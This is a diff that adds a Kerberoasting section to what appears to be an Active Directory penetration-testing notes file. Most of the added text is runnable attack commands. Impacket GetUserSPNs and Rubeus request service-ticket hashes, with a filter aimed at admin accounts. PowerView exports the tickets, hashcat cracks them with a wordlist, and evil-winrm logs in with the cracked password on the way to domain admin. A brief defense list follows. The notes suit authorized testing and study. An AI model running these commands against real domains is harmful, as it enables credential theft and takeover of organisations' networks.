@@ -214,6 +214,49 @@ When on a managed host with no internet/tooling, built-ins do the enum:
 
 > The pattern: enumerate defenses → pick tooling that survives them (built-in/LotL under AppLocker+CLM) → map everything in BloodHound → the shortest path to DA appears. Snaffler + share spidering find the creds people leave lying around.
 
+## Kerberoasting (detail)
+**Why it works:** any authenticated domain user can request a **TGS** for any account with an **SPN** (service accounts). The ticket is encrypted with the service account's password hash → crack it offline. No special privileges needed, which is why it's a top early win. Service accounts often have old, weak, non-expiring passwords.
+
+### From Linux (Impacket)
+```bash
+# list kerberoastable SPNs
+GetUserSPNs.py -dc-ip <DC> <DOMAIN>/<USER>
+# request + save all TGS hashes
+GetUserSPNs.py -dc-ip <DC> <DOMAIN>/<USER> -request -outputfile tgs.hashes
+# target one account
+GetUserSPNs.py -dc-ip <DC> <DOMAIN>/<USER> -request-user <svc> -outputfile svc.hash
+```
+
+### From Windows (Rubeus = modern go-to)
+```powershell
+.\Rubeus.exe kerberoast /nowrap                      # all roastable accounts, hashcat-ready
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap   # only high-value (admin) SPNs
+.\Rubeus.exe kerberoast /stats                       # recon: how many, which encryption
+# PowerView alternative
+Import-Module .\PowerView.ps1
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv tgs.csv -NoType
+# built-in enumeration
+setspn.exe -Q */*
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+```
+(Legacy manual path: mimikatz `kerberos::list /export` → base64 → `.kirbi` → kirbi2john → hashcat. Rubeus replaces all of this.)
+
+### Crack & use
+```bash
+hashcat -m 13100 tgs.hashes /usr/share/wordlists/rockyou.txt      # (john: --format=krb5tgs)
+```
+Cracked service-account password → test/use it:
+```bash
+evil-winrm -i <HOST> -u <svc> -p '<pass>'
+```
+If that account is privileged (or `admincount=1`), you may jump straight toward DA.
+
+### Defense (report)
+- **Strong, long (25+ char) managed service-account passwords** (gMSA where possible) → uncrackable.
+- Least privilege for service accounts; monitor **Event ID 4769** (TGS requests) for roasting patterns; prefer AES over RC4.
+
+> Kerberoast is the "any domain user" attack — the moment you have one foothold credential, run it. `/ldapfilter:'admincount=1'` focuses on the accounts whose crack actually matters.
+
 ## AD attack flow (reference)
 Key ports: 88 (Kerberos), 135/593 (RPC), 139/445 (SMB), 389/636/3268/3269 (LDAP/GC), 464 (kpasswd), 3389 (RDP).
 
